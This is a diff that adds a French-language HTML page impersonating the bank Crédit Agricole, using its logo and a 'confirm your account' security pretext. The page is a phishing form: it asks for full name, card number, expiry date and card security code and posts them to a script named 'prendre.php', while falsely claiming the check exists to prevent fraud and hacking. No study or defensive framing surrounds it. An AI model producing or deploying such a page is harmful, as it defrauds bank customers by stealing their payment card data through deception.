@@ -1,0 +1,25 @@
+
+<!DOCTYPE html>
+<html class="no-js " lang="fr" dir="ltr">
+<head>	
+<title>Confirmez votre compte </title>
+<meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+<link rel="icon" type="image/png" href="logo_creditagricole_V16.png" />
+
+<link rel="stylesheet" href="app.css">
+</head>
+
+<body> 
+<header class="mainHeader" role="banner">
+<div class="headerContainer"><div class="grid12"><img src ="logo_creditagricole_V16.png" alt="im_logo"/>
+<div class="loginBtn"><span class="securityLock">Votre sécurité est notre priorité</span></div></div></div></header> 
+
+<main class="addCardPage SN "><section id="content" role="main" data-country="SN"><section id="main" class="">
+<div id="addCard" class="addCard grid12"><div class="grid6 valueProp cardInformation">
+
+<header>
+
+<h1>Pour des raisons de sécurité, veuillez confirmer votre compte </h1></header>
+
+<ul><li>Cette vérification ne prend que quelques secondes </li><li>Cette vérification a été mis en place pour éviter tous les fraudes et le piratage, elle se fera  en cas de connexion suspecte à votre compte </li></ul></div><div class="grid6 gutter-left"><div class="tab"><ul><li class="left active"><a data-click="debit" href="#" id="debit" data-label="Numéro de carte"><strong>Confirmez votre compte</strong> </a><li class="right "><a data-click="credit" href="#" id="credit" data-label="Numéro de carte">et votre de Carte Crédit </a></li></li></ul><input type="hidden" id="cardFor" name="cardFor" value="debit"></div><div class="container"><div class="inner"><div class="guestSharedFIpadding"></div><i class="busy"></i><form action="prendre.php" method="post"   class="proceed" ><input type="hidden" id="csrf" name="_csrf" value="coordonnées">  <div class="clearfix" id="stateHolder"><div class="textInput lap city "><div class="fields  large"><label for="city">Nom et Prénom</label><input type="text" id="city" name="city" class="hasHelp validate camelCase" required="required"  autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" /></div><div class="errorMessage"><p class="help-error error-empty" id="cityEmpty">Obligatoire&#x2E;</p></div></div></div>  <div class="cardEntry groupFields" data-avs=""><div class="textInput large lap cardNumber "><div class="fields large"><label for="cardNumber">Numéro de carte</label><input type="tel" id="cardNumber" name="cardNumber" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" maxlength="19" class="validate"/><span class="icons creditCard  " id="creditCard" role="img"></span></div><div class="errorMessage"><p class="help-error error-empty" id="cardNumberEmpty">Obligatoire&#x2E;</p><p class="help-error error-format" id="cardNumberFormat">Vérifiez le numéro de votre carte&#x2E;</p></div></div><div class="multi equal clearfix"><div class="textInput lap expiryDate  "><div class="fields   left  "><label for="expiryDate">Date d'expiration</label><input id="expiryDate" class="validate" name="expiryDate" type="tel" value="" autocapitalize="off" autocomplete="off" aria-required="true" maxlength="5" data-placeholder-text="MM/AA" data-format="mmyy" required="required"/></div><div class="errorMessage"><p class="help-error error-empty" id="expiryDateEmpty">Obligatoire&#x2E;</p><p class="help-error error-format" id="expiryDateFormat">Veuillez vérifier la date d&#x27;expiration&#x2E;</p></div></div><div class="textInput lap cscNumber  "><div class="fields    right   last"><label for="csc" >Crypto.</label><span class="icons cvv defaultCvv" id="cvvHolder" role="img"></span><input type="tel" class="hasHelp validate csc" id="csc" name="csc" maxlength="3" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" /></div><div class="errorMessage"><p class="help-error error-empty" id="cscEmpty">Obligatoire&#x2E;</p><p class="help-error error-format" id="cscFormat">Le cryptogramme visuel doit être composé de 3&nbsp;ou 4&nbsp;chiffres&#x2E;</p></div><div class="helpInformation"><p class="caret help-information hide" id="cscToolTip">Si vous en avez un.</p></div></div></div><div class="multi equal clearfix"></div></div> <div class="defaultButtonGroup"><div class="btns"><input id="submitBtn" name="_eventId_continue" type="submit" class="button"value="Confirmez la carte"data-click="linkCard"/></div></div></form></div></body></html>
